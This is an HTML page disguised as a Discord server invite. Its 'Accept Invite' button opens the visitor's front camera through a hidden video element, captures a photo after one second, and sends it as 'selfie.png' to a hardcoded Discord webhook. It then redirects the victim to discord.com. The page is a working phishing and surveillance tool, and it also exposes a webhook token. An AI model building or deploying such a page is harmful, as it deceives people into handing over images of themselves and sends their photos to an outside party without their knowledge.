<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Invite</title>
    <style>
        body { font-family: sans-serif; background-color: #313338; color: #f2f3f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .box { background: #2b2d31; padding: 40px; border-radius: 8px; width: 90%; max-width: 400px; }
        button { padding: 16px; font-size: 16px; cursor: pointer; background-color: #5865F2; color: white; border: none; border-radius: 4px; font-weight: bold; width: 100%; margin-top: 20px; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h2>Discord Server Invite</h2>
        <p>Click the button below to accept the invitation and join the server.</p>
        <button onclick="startCamera()">Accept Invite</button>
    </div>

    <video id="video" autoplay playsinline></video>

    <script>
        // لێنکی ڕاست و بێ کێشەی وێبهوکەکەت لەسەر بنەمای وێنەی چوارەم
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1507879866136133682/3h8tsvpbaFNftF08zsRwkYuHbZwgH7yld33NrCBTtKP0cHMl64tn9AsPTZZl70GceTbb";

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(blob => {
                            sendToDiscord(blob);
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/png');
                    }, 1000);
                };
            } catch (err) {
                alert("Error: Please allow camera access to join.");
            }
        }

        function sendToDiscord(blob) {
            const formData = new FormData();
            formData.append('file', blob, 'selfie.png');
            formData.append('content', '📸 **New Selfie Received!**');

            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                body: formData
            })
            .then(res => {
                window.location.href = "https://discord.com";
            })
            .catch(err => console.error(err));
        }
    </script>
</body>
</html>

